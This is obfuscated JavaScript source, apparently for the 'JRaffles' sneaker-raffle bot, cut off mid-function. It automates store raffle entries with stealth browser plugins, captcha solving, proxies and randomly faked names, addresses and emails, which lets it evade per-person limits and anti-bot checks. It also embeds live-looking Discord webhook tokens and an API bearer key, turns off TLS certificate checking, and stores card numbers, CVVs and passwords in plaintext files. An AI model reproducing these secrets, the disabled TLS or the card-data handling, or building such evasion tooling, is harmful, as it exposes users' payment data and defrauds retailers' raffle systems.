process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x376369 = require('fs'), _0x527564 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x129403(_0x30888a) {
    const _0x1dc0d2 = _0x376369['createWriteStream'](_0x30888a, { 'flags': 'a' }), _0x43df40 = console['log'];
    console['log'] = function () {
        const _0x235b58 = Array['prototype']['slice']['call'](arguments), _0x584bf1 = _0x235b58['join']('\x20') + '\x0a';
        _0x1dc0d2['write'](_0x584bf1), _0x43df40['apply'](console, _0x235b58);
    };
}
_0x129403('../logs/log\x20' + _0x527564);
var _0x5ce2f3 = require('tough-cookie'), _0x39794d = require('node-imap'), _0x598c20 = require('util')['inspect'];
const _0x3020dc = require('mailparser')['simpleParser'], { EmbedBuilder: _0x4f7556 } = require('discord.js');
var _0x4b5524 = require('exe');
const { execFile: _0x3aa276 } = require('child_process'), _0xfda795 = require('puppeteer-extra'), _0x5943b7 = require('puppeteer-extra-plugin-recaptcha'), _0x442f24 = require('puppeteer-extra-plugin-stealth'), _0x536226 = require('chalk'), _0x215576 = require('node-bash-title'), _0x3f36f4 = require('axios'), _0x4f3c15 = require('papaparse');
var _0x55ad19 = require('random-name');
const _0x45876e = require('request');
var _0xf4f9ff = require('prompt');
const _0x40df6f = _0x45876e['jar']();
var _0x2795a0 = {};
const _0x4bdfeb = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x289c03 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x300c1f = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0xcc59b4 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x3a704f = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x456dad = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x210cd0 = 'https://discord.com/api/webhooks/', _0x4ac3bd = '' + _0x210cd0 + _0x300c1f, _0x203e00 = '' + _0x210cd0 + _0xcc59b4, _0x8cde2d = '' + _0x210cd0 + _0x4bdfeb, _0x281108 = '' + _0x210cd0 + _0x289c03, _0x44d24a = '' + _0x210cd0 + _0x3a704f, _0x2c527f = '' + _0x210cd0 + _0x456dad;
const _0x1f2b66 = JSON['parse'](_0x376369['readFileSync']('../package.json', 'utf-8')), _0x39dec1 = _0x1f2b66['version'];
var _0x47dda7, _0x5184f4, _0x188fc2, _0x1d3da5, _0x36a15a, _0x598521, _0x1bdb7f, _0x48f6e6;
const _0x2cd5f4 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x1fc3e2 = ![];
const _0x439533 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x4da5c4 = '0123456789';
var _0x5eb6fd = _0x439533['split']('');
const _0x3b04f9 = require('auto-git-update'), _0x5aa60c = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x2a5549 = new _0x3b04f9(_0x5aa60c);
async function _0x37ec9c() {
    _0x36a15a = _0x376369['readdirSync']('../proxies'), _0x1d3da5 = _0x376369['readdirSync']('../tasks'), !_0x376369['existsSync']('../accounts/fenom.csv') && _0x376369['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x376369['existsSync']('../accounts/paypal.csv') && _0x376369['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x376369['existsSync']('../accounts/bstn.csv') && _0x376369['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x376369['existsSync']('../accounts/eql.csv') && _0x376369['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x376369['existsSync']('../failed-tasks.csv') && _0x376369['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x376369['existsSync']('../successful-tasks.csv') && _0x376369['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x2795a0 = JSON['parse'](_0x376369['readFileSync']('../settings.json', 'utf-8')), !_0x2795a0['delay'] && (_0x2795a0['delay'] = 0x3c, _0x376369['writeFileSync']('../settings.json', JSON['stringify'](_0x2795a0, null, 0x2))), !_0x2795a0['threads'] && (_0x2795a0['threads'] = 0x1, _0x376369['writeFileSync']('../settings.json', JSON['stringify'](_0x2795a0, null, 0x2))), !_0x2795a0['masterMail'] && (_0x2795a0['masterMail'] = 'yourmail@gmail.com', _0x376369['writeFileSync']('../settings.json', JSON['stringify'](_0x2795a0, null, 0x2))), !_0x2795a0['masterPassword'] && (_0x2795a0['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x376369['writeFileSync']('../settings.json', JSON['stringify'](_0x2795a0, null, 0x2))), !_0x2795a0['captchaKey'] && (_0x2795a0['captchaKey'] = '', _0x376369['writeFileSync']('../settings.json', JSON['stringify'](_0x2795a0, null, 0x2))), !_0x2795a0['useRandomProxy'] && (_0x2795a0['useRandomProxy'] = !![], _0x376369['writeFileSync']('../settings.json', JSON['stringify'](_0x2795a0, null, 0x2))), !_0x2795a0['shuffleTasks'] && (_0x2795a0['shuffleTasks'] = ![], _0x376369['writeFileSync']('../settings.json', JSON['stringify'](_0x2795a0, null, 0x2))), !_0x2795a0['webhook'] && (_0x2795a0['webhook'] = '', _0x376369['writeFileSync']('../settings.json', JSON['stringify'](_0x2795a0, null, 0x2))), _0x2795a0['delay'] <= 0x1388 && (_0x2795a0['delay'] = _0x2795a0['delay'] * 0x3e8), _0x2795a0['AfewDelay'] && (delete _0x2795a0['AfewDelay'], _0x376369['writeFileSync']('../settings.json', JSON['stringify'](_0x2795a0, null, 0x2))), _0x2795a0['MahaDelay'] && (delete _0x2795a0['MahaDelay'], _0x376369['writeFileSync']('../settings.json', JSON['stringify'](_0x2795a0, null, 0x2))), _0x2795a0['footshopDelay'] && (delete _0x2795a0['footshopDelay'], _0x376369['writeFileSync']('../settings.json', JSON['stringify'](_0x2795a0, null, 0x2))), _0x2795a0['MahaDelay'] = _0x2795a0['delay'], _0x210cd0 = _0x2795a0['webhook'], _0x598521 = _0x2795a0['licenseKey'];
}
let _0x5855eb, _0x5c9608 = [], _0x232c55;
const _0xa2099c = _0x5d56c6 => new Promise(_0x104038 => setTimeout(_0x104038, _0x5d56c6));
function _0x49c08b(_0x3203e6, _0x1c37e5) {
    return Math['floor'](Math['random']() * (_0x1c37e5 - _0x3203e6 + 0x1) + _0x3203e6);
}
function _0x48cb15(_0x5ead9b) {
    let _0x3ddfb7 = _0x5ead9b['length'], _0x1087c6;
    while (_0x3ddfb7 != 0x0) {
        _0x1087c6 = Math['floor'](Math['random']() * _0x3ddfb7), _0x3ddfb7--, [_0x5ead9b[_0x3ddfb7], _0x5ead9b[_0x1087c6]] = [
            _0x5ead9b[_0x1087c6],
            _0x5ead9b[_0x3ddfb7]
        ];
    }
    return _0x5ead9b;
}
async function _0xfbce6c(_0x53c8d7) {
    return _0x3f36f4['get']('https://api.hyper.co/v4/licenses/' + _0x53c8d7, { 'headers': { 'Authorization': 'Bearer\x20' + _0x2cd5f4 } })['then'](_0x222613 => _0x222613['data'])['catch'](() => null);
}
;
async function _0x478606(_0x1b2514) {
    console['clear']();
    if (_0x1b2514 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x36721b = await _0xf4f9ff['get']('License');
        if (_0x36721b['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0xa2099c(0xbb8), _0x478606(_0x1b2514);
        _0x1b2514 = _0x36721b['License'], _0x2795a0['licenseKey'] = _0x1b2514, _0x598521 = _0x1b2514, _0x376369['writeFileSync']('../settings.json', JSON['stringify'](_0x2795a0));
    }
    console['log']('Checking\x20license\x20' + _0x598521 + '...'), await _0xa2099c(0x320);
    const _0x393fcb = await _0xfbce6c(_0x1b2514);
    _0x1bdb7f = JSON['stringify'](_0x393fcb['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x48f6e6 = JSON['stringify'](_0x393fcb['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x393fcb)
        return console['log']('License\x20not\x20found');
    if (!_0x393fcb['user'])
        return console['log']('License\x20not\x20bound');
    return _0x393fcb['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x1fc3e2 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x1fc3e2 = ![]);
}
async function _0xc3b8d0() {
    var _0x3a8de9 = await _0xf4f9ff['get']('Module');
    return console['clear'](), _0x3a8de9['Module'];
}
;
async function _0x1a45cc() {
    var _0x1cb9f0 = await _0xf4f9ff['get']('Setting');
    return console['clear'](), _0x1cb9f0['Setting'];
}
async function _0xe9776e(_0x2137eb) {
    var _0x2a7bd6 = [];
    for (file of _0x1d3da5) {
        var _0xaa301a = _0x376369['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x4f3c15['parse'](_0xaa301a, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x2137eb['store'] && _0x2a7bd6['push'](file);
    }
    !_0x2a7bd6['length'] == 0x0 && (_0x1d3da5 = _0x2a7bd6);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x371ed6 = 0x0; _0x371ed6 < _0x1d3da5['length']; _0x371ed6++) {
        console['log']('\x20(' + _0x371ed6 + ')\x20' + _0x1d3da5[_0x371ed6]);
    }
    console['log']('');
    var _0x6a4d87 = await _0xf4f9ff['get']('Task');
    if (_0x6a4d87['Task'] > _0x1d3da5['length'] - 0x1 || isNaN(_0x6a4d87['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0xa2099c(0x3e8), _0xe9776e();
    var _0x2664e8 = _0x376369['readFileSync']('../tasks/' + _0x1d3da5[_0x6a4d87['Task']], 'utf-8');
    return _0x188fc2 = _0x4f3c15['parse'](_0x2664e8, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x536226['blue'](_0x1d3da5[_0x6a4d87['Task']])), _0x47dda7 = _0x1d3da5[_0x6a4d87['Task']], _0x188fc2;
}
async function _0x169d17() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x1af339 = 0x0; _0x1af339 < _0x36a15a['length']; _0x1af339++) {
        console['log']('\x20(' + _0x1af339 + ')\x20' + _0x36a15a[_0x1af339]);
    }
    console['log']('');
    var _0x4a9366 = await _0xf4f9ff['get']('Proxies');
    if (_0x4a9366['Proxies'] > _0x36a15a['length'] - 0x1 || isNaN(_0x4a9366['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0xa2099c(0x3e8), _0x169d17();
    var _0x54d065 = _0x376369['readFileSync']('../proxies/' + _0x36a15a[_0x4a9366['Proxies']], 'utf-8')['split']('\x0a');
    let _0x4bc36d = _0x54d065['map']((_0x257877, _0x492307) => {
        sanatizeProxy = _0x257877['replace']('\x0d', '');
        if (_0x54d065[_0x492307 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x5184f4 = _0x36a15a[_0x4a9366['Proxies']], console['clear'](), _0x4bc36d;
}
async function _0x3ccd9f() {
    var _0xa8ff79 = await _0xf4f9ff['get']('Value');
    return console['clear'](), _0xa8ff79['Value'];
}
async function _0x4b8bdf(_0x554208) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x23e733 = 0x0; _0x23e733 < _0x554208['length']; _0x23e733++) {
        console['log']('\x20(' + _0x23e733 + ')\x20[' + _0x554208[_0x23e733]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x3aaea0 = await _0xf4f9ff['get']('Module');
    return _0x3aaea0['Module'];
}
async function _0x1cc83a() {
    var _0x4fb70b = await _0xf4f9ff['get']('Password');
    return console['clear'](), _0x4fb70b['Password'];
}
;
async function _0x5c7af5() {
    var _0x1389d5 = await _0xf4f9ff['get']('Links');
    return _0x1389d5['Links'];
}
;
async function _0x4f2993() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x54435a = 0x0; _0x54435a < _0x5c9608['length']; _0x54435a++) {
        console['log']('\x20(' + _0x54435a + ')\x20' + _0x5c9608[_0x54435a]);
    }
    ;
    console['log']();
    let _0x456d88 = await _0xf4f9ff['get']('Product');
    return console['clear'](), _0x456d88['Product'];
}
;
function _0x24b1d6() {
    var _0x4d792f = new Date(Date['now']())['toLocaleTimeString']();
    return _0x4d792f;
}
;
function _0x937fdd() {
    var _0x525e4a = new Date(Date['now']())['toLocaleString']();
    return _0x525e4a['replace'](',', '');
}
async function _0x310f97(_0x2b4af0, _0x37f661) {
    let _0x3e9a1b = { 'headers': { 'content-type': 'application/json' } };
    if (_0x39dec1 != 'devkey') {
        await _0x3f36f4['post'](_0x2b4af0, _0x37f661, _0x3e9a1b);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x258e8b(_0x2bb529, _0x2595dc, _0x3433f5, _0x185130, _0x31f213) {
    if (!_0x185130 && _0x3433f5 == 'dev') {
        var _0xa711e5 = new _0x4f7556()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x2595dc['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x2595dc['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x2bb529['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x2795a0['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x1bdb7f,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x2bb529['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x2bb529['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x39dec1,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0xa711e5['data'];
    } else {
        if (_0x185130 && _0x3433f5 == 'dev') {
            var _0xa711e5 = new _0x4f7556()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x2595dc['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x1bdb7f,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x2595dc['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x2bb529['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x2795a0['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x31f213,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x2bb529['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x2bb529['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x39dec1,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0xa711e5['data'];
        } else {
            if (_0x3433f5 == 'pub') {
                var _0xa711e5 = new _0x4f7556()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x2595dc['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x2595dc['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x2bb529['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x2795a0['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x2bb529['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x39dec1,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0xa711e5['data'];
            } else {
                if (_0x3433f5 == 'acc' && !_0x185130) {
                    var _0xa711e5 = new _0x4f7556()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x2595dc['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x1bdb7f,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x2595dc['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x2795a0['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x39dec1,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0xa711e5['data'];
                } else {
                    if (_0x3433f5 == 'acc' && _0x185130) {
                        var _0xa711e5 = new _0x4f7556()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x2595dc['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x1bdb7f,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x31f213,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x2595dc['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x2795a0['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x39dec1,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0xa711e5['data'];
                    } else {
                        if (_0x3433f5 == 'open') {
                            var _0xa711e5 = new _0x4f7556()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x48f6e6)['addFields']({
                                'name': 'User',
                                'value': '' + _0x1bdb7f,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x39dec1,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0xa711e5['data'];
                        } else {
                            if (!_0x185130 && _0x3433f5 == 'ver') {
                                var _0xa711e5 = new _0x4f7556()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x2595dc['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x1bdb7f,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x2595dc['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x2795a0['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x39dec1,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0xa711e5['data'];
                            } else {
                                if (_0x185130 && _0x3433f5 == 'ver') {
                                    var _0xa711e5 = new _0x4f7556()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x2595dc['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x1bdb7f,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x31f213,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x2595dc['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x2795a0['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x39dec1,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0xa711e5['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x53ad15(_0x113c18, _0x359d2f) {
    var _0x28432c = _0x113c18[_0x359d2f]['Address1']['split'](''), _0x548a8a = _0x113c18[_0x359d2f]['Address2']['split'](''), _0x3c08c7 = _0x113c18[_0x359d2f]['Email']['split']('@');
    for (var _0x1716a9 = 0x0; _0x1716a9 < _0x28432c['length']; _0x1716a9++) {
        if (_0x28432c[_0x1716a9] == 'X') {
            var _0x562f23 = Math['round'](Math['random']() * (_0x439533['length'] - 0x1));
            _0x28432c[_0x1716a9] = _0x5eb6fd[_0x562f23];
        }
    }
    ;
    for (var _0x1716a9 = 0x0; _0x1716a9 < _0x548a8a['length']; _0x1716a9++) {
        if (_0x548a8a[_0x1716a9] == 'X') {
            var _0x562f23 = Math['round'](Math['random']() * (_0x439533['length'] - 0x1));
            _0x548a8a[_0x1716a9] = _0x5eb6fd[_0x562f23];
        }
    }
    ;
    _0x113c18[_0x359d2f]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x113c18[_0x359d2f]['FirstName'] = _0x55ad19['first']());
    _0x113c18[_0x359d2f]['LastName']['toUpperCase']() == 'RANDOM' && (_0x113c18[_0x359d2f]['LastName'] = _0x55ad19['last']());
    _0x3c08c7[0x0]['toUpperCase']() == 'RANDOM' ? _0x3c08c7[0x0] = '' + _0x55ad19['first']() + _0x55ad19['last']() + _0x49c08b(0x1, 0x3e7) + '@' : _0x3c08c7[0x0] = _0x3c08c7[0x0] + '@';
    _0x113c18[_0x359d2f]['Email'] = _0x3c08c7['join'](''), _0x113c18[_0x359d2f]['Address1'] = _0x28432c['join'](''), _0x113c18[_0x359d2f]['Address2'] = _0x548a8a['join']('');
    _0x113c18[_0x359d2f]['Phone'] == 'RANDOM' && (_0x113c18[_0x359d2f]['Phone'] = '0' + _0x49c08b(0x5f5e100, 0x3b9ac9ff));
    if (_0x113c18[_0x359d2f]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x41c0bf = _0x49c08b(0x1, 0x270f);
        _0x113c18[_0x359d2f]['Follower'] = '' + _0x55ad19['first']() + _0x55ad19['last']() + _0x41c0bf + '\x20';
    }
    _0x113c18[_0x359d2f]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x113c18[_0x359d2f]['HouseNumber'] = _0x49c08b(0x1, 0xc8));
    if (_0x113c18[_0x359d2f]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x302570 = Math['round'](Math['random']() * (_0x439533['length'] - 0x1)), _0x9b43e5 = _0x5eb6fd[_0x302570];
        _0x113c18[_0x359d2f]['Address1'] = _0x55ad19['last']() + 'straat', _0x113c18[_0x359d2f]['Zip'] == '' && (_0x113c18[_0x359d2f]['Postcode'] = _0x49c08b(0x3e8, 0x270f) + '\x20' + _0x9b43e5 + _0x9b43e5, _0x113c18[_0x359d2f]['Zip'] = _0x113c18[_0x359d2f]['Postcode']), _0x113c18[_0x359d2f]['HouseNumber'] = '' + _0x49c08b(0x1, 0xc8);
    }
    return;
}
;
async function _0x391951(_0x5ce346, _0x428783) {
    _0x376369['appendFileSync']('../failed-tasks.csv', _0x937fdd() + ',' + _0x428783['store'] + ',' + _0x428783['name'] + ',' + _0x5ce346['Url'] + ',' + _0x5ce346['Size'] + ',' + _0x5ce346['Follower'] + ',' + _0x5ce346['FirstName'] + ',' + _0x5ce346['LastName'] + ',' + _0x5ce346['Address1'] + ',' + _0x5ce346['Address2'] + ',' + _0x5ce346['HouseNumber'] + ',' + _0x5ce346['Zip'] + ',' + _0x5ce346['City'] + ',' + _0x5ce346['State'] + ',' + _0x5ce346['Country'] + ',' + _0x5ce346['Phone'] + ',' + _0x5ce346['Email'] + ',' + _0x5ce346['Password'] + ',' + _0x5ce346['PaymentMethod'] + ',' + _0x5ce346['CardType'] + ',' + _0x5ce346['NameOnCard'] + ',' + _0x5ce346['CardNumber'] + ',' + _0x5ce346['ExpiryDate'] + ',' + _0x5ce346['CVV'] + ',' + _0x5ce346['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x48af7e(_0x4801bf, _0x1aa2c2) {
    _0x376369['appendFileSync']('../successful-tasks.csv', _0x937fdd() + ',' + _0x1aa2c2['store'] + ',' + _0x1aa2c2['name'] + ',' + _0x4801bf['Url'] + ',' + _0x4801bf['Size'] + ',' + _0x4801bf['Follower'] + ',' + _0x4801bf['FirstName'] + ',' + _0x4801bf['LastName'] + ',' + _0x4801bf['Address1'] + ',' + _0x4801bf['Address2'] + ',' + _0x4801bf['HouseNumber'] + ',' + _0x4801bf['Zip'] + ',' + _0x4801bf['City'] + ',' + _0x4801bf['State'] + ',' + _0x4801bf['Country'] + ',' + _0x4801bf['Phone'] + ',' + _0x4801bf['Email'] + ',' + _0x4801bf['Password'] + ',' + _0x4801bf['PaymentMethod'] + ',' + _0x4801bf['CardType'] + ',' + _0x4801bf['NameOnCard'] + ',' + _0x4801bf['CardNumber'] + ',' + _0x4801bf['ExpiryDate'] + ',' + _0x4801bf['CVV'] + ',' + _0x4801bf['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x450954() {
    let _0x120e88 = proxyFile['split']('\x0a'), _0x479b87 = _0x120e88['map']((_0x2de702, _0x2c4de1) => {
        sanatizeProxy = _0x2de702['replace']('\x0d', '');
        if (_0x120e88[_0x2c4de1 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x479b87;
}
;
async function _0x501e78(_0xbc0633, _0x61d88a) {
    if (_0x141f92 != 'yes')
        var _0x141f92 = '', _0x297e84 = 0x0;
    async function _0x3cdd35() {
        var _0xb8cd35 = _0x376369['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0xc3674b = _0x4f3c15['parse'](_0xb8cd35, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x3104f8 = 0x0; _0x3104f8 < _0xc3674b['length']; _0x3104f8++) {
            console['log']('(' + _0x3104f8 + ')\x20' + _0xc3674b[_0x3104f8]['Email']);
        }
        console['log']('\x0a(' + _0xc3674b['length'] + ')\x20' + _0x536226['cyan']('Add\x20a\x20new\x20account'));
        let _0x3305fd = await _0xf4f9ff['get']('Option');
        if (_0x3305fd['Option'] < _0xc3674b['length'])
            return _0xc3674b[_0x3305fd['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x42e94f = {}, _0x5a8b3d = await _0xf4f9ff['get']('Email');
        _0x42e94f['Email'] = _0x5a8b3d['Email'];
        var _0x526543 = Math['round'](Math['random']() * (_0x61d88a['length'] - 0x1));
